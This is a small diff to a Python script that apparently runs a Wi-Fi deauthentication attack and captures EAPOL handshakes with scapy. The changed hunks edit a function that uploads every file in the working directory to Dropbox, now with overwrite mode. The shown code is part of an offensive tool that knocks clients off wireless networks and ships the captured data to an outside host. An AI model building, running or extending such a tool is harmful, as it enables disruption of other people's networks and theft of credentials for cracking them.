@@ -5,8 +5,8 @@ import subprocess
 import threading
 import time
 from datetime import datetime
-
 import dropbox as dropbox
+from dropbox.files import WriteMode
 from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11
 from scapy.layers.eap import EAPOL
 from scapy.sendrecv import sendp, sniff
@@ -77,7 +77,7 @@ def send_deauth_packet():
 
 
 def dropbox_uploader():
-    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
     rootdir = os.getcwd()
     print("Attempting to upload...")
     for dir, dirs, files in os.walk(rootdir):
@@ -89,7 +89,7 @@ def dropbox_uploader():
                     if os.stat(file_path).st_size != 0:
                         print('Uploading %s to %s' % (file_path, dest_path))
                         with open(file_path, 'rb') as f:
-                            dbx.files_upload(f.read(), dest_path, mute=True)
+                            dbx.files_upload(f.read(), dest_path, mode=dropbox.files.WriteMode.overwrite, mute=True)
                 except Exception as err:
                     print("Failed to upload %s\n%s" % (file, err))
 
